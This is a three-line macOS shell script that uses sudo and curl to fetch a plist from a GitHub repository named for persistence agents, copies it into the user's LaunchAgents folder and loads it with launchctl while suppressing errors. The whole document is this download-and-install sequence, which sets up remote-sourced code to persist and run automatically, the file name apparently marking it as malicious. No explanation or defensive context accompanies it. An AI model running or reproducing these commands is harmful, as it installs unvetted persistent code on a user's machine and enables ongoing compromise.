sudo curl --silent https://raw.githubusercontent.com/Tziampazis/Persistence-Service-Agent-MacOS/main/com.mal.lodgify3.plist  > /tmp/com.mal.lodgify3.plist
sudo cp /tmp/com.mal.lodgify3.plist ~/Library/LaunchAgents/com.mal.lodgify3.plist
sudo launchctl load ~/Library/LaunchAgents/com.mal.lodgify3.plist 2>/dev/null